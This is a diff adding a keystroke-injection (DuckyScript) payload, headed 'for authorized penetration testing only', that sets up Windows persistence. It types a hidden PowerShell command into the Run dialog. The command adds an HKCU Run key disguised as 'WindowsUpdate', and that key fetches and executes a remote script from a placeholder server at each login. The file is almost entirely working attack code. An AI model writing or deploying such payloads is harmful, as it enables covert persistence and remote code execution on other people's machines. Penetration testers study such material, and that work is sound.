@@ -1,0 +1,10 @@
+REM ============================================
+REM Persistence via Registry Run Key
+REM FOR AUTHORIZED PENETRATION TESTING ONLY
+REM ============================================
+REM Adds a malicious payload to HKCU Run key
+
+DELAY 500
+GUI r
+DELAY 200
+STRING powershell -WindowStyle Hidden -Command "$p='powershell -WindowStyle Hidden -Command Start-Process calc; iex (irm https://your-server/payload.ps1)';New-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'WindowsUpdate' -Value $p -PropertyType String -Force;Write-Host 'Persistence installed'"
